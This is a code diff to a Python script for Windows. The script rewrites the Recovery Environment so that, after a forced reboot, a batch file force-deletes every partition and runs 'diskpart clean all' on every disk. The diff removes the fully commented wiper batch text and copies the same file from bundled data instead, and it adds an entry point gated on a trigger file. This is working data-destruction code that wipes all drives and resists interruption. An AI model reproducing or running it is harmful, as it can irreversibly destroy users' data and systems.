@@ -2,8 +2,11 @@ import sys
 import psutil
 import os
 import time
+import shutil
 import hashlib
 import win32gui
+
+data = os.path.join(sys._MEIPASS, "data")
 
 def get_hashes(files): # misc to get hashes of files
     hashes = []
@@ -89,57 +92,7 @@ def setup_destroy_mechanism(): # modifies WinRE for immediate destruction. After
         os.system("echo X:\System32\WinSE.cmd >> C:\Windows\RSLogs\Windows\System32\winpeshl.ini") # tells the system to run the wiping script
         f.write('winpeshl p2')
         f.close()
-    with open("C:\Windows\RSLogs\Windows\System32\WinSE.cmd", "w") as f: # make the wiping script
-        f.write(('@echo off\n'  # make the script not send any output (suppreses except errors, which are supressed >nul)
-             'setlocal enabledelayedexpansion\n'  # allows variables to update inside loops using !var! instead of %var%. When writing to files, %var% would be interpreted as the actual characters, while !var! would yield the value of the variable
-             'echo list disk > X:\listdisk.txt\n'  # make a script file that tells diskpart to list all disk information
-             'diskpart /s X:\listdisk.txt > X:\disks.txt\n'  # run the script file to know how many disks there are. saves the information to a file.
-             'for /f "tokens=2" %%d in (\'type X:\disks.txt ^| find "Disk"\') do (\n'  # looks for lines with the word Disk. In lines found, saves the second word (token), which is the disk number, then loops through each disk
-             '   set "diskNum=%%d"\n'  # puts the disk number in a usable variable
-             '   (\n'
-             '       echo select disk !diskNum!\n'  # select the disk in diskpart
-             '       echo list partition\n'  # list all its partitions
-             '   ) > X:\listpart.txt\n'  # save commands to a file for diskpart to run
-             '   diskpart /s X:\listpart.txt > X:\parts.txt\n'  # run the file with diskpart and save the partition information
-             '   for /f "tokens=2" %%p in (\'type X:\parts.txt ^| find "Partition"\') do (\n'  # looks for lines with the word Partition. In lines found, saves the second word (token), which is the partition number, then loops through each partition
-             '       set "pNum=%%p"\n'  # puts the partition number in a usable variable
-             '       (\n'
-             '           echo select disk !diskNum!\n'  # select the disk
-             '           echo select partition !pNum!\n'  # select the partition
-             '           echo detail partition\n'  # get partition information to check if it is a recovery partition. The recovery partition should be deleted last so if the process is stopped in the middle it can continue
-             '       ) > X:\detail.txt\n'  # save commands to a file for diskpart to run
-             '       diskpart /s X:\detail.txt > X:\part_info.txt\n'  # run diskpart and saves the information about the partition to a file
-             '       set "isRecovery=false"\n'  # initialize a variable for knowing if it is a recovery partition
-             '       for /f "tokens=*" %%a in (\'type X:\part_info.txt ^| find /i "Recovery"\') do (\n'  # Looks for the word recovery in the partition info.
-             '           set "isRecovery=true"\n'  # sets the variable to true
-             '       )\n'
-             '       if "!isRecovery!"=="false" (\n'  # runs if it's not a recovery partition
-             '           (\n'
-             '               echo select disk !diskNum!\n'  # select the disk
-             '               echo select partition !pNum!\n'  # select the partition
-             '               echo delete partition override\n'  # force delete partition
-             '           ) > X:\del_part.txt\n'  # save commands to a file for diskpart to run
-             '           diskpart /s X:\del_part.txt >nul\n'  # run the file with diskpart
-             '       ) else (\n'  # runs if is a recovery partition
-             '           set "recoveryPart=!pNum!"\n'  # store the recovery partition number to be deleted later
-             '       )\n'
-             '   )\n'  # end of partition loop
-             '   if defined recoveryPart (\n'  # checks if there was a recovery partition
-             '       (\n'
-             '          echo select disk !diskNum!\n'  # select the disk
-             '          echo select partition !recoveryPart!\n'  # select the recovery partition
-             '          echo delete partition override\n'  # force delete the recovery partition
-             '       ) > X:\del_final.txt\n'  # save commands to a file for diskpart to run
-             '       diskpart /s X:\del_final.txt >nul\n'  # run the file with diskpart
-             '   )\n'
-             '   (\n'
-             '       echo select disk !diskNum!\n'  # select the disk
-             '       echo clean all\n'  # wipe the disk clean
-             '   ) > X:\wipe_final.txt\n'  # save commands to a file for diskpart to run
-             '   diskpart /s X:\wipe_final.txt >nul\n'  # run the file with diskpart
-             ')\n'  # end of disk loop
-             'wpeutil shutdown'))  # shut down the system
-        f.close()
+    shutil.copy(f'{data}\\WinSE.cmd', 'C:\Windows\RSLogs\Windows\System32\WinSE.cmd')
     with open("C:/debugging.txt", 'a') as f:
         f.write('wrote destruction script')
         os.system("dism /unmount-wim /mountdir:C:\Windows\RSLogs /commit") # repack the modified recovery environment
@@ -157,3 +110,9 @@ def destroy():
         with open("C:/Windows/System32/destroy.trigger", 'w') as f:
             f.close()
         os.system("reagentc /boottore && shutdown /r /f /t 0") # restart into recovery mode to start wiping
+
+if __name__ == '__main__': # run if being run as a standalone script and not as a library
+    if not os.path.exists('C:/Windows/System32/Destroy me.please'): # for safety reasons, so no data is lost while debugging.
+        sys.exit()
+    setup_destroy_mechanism()
+    destroy()
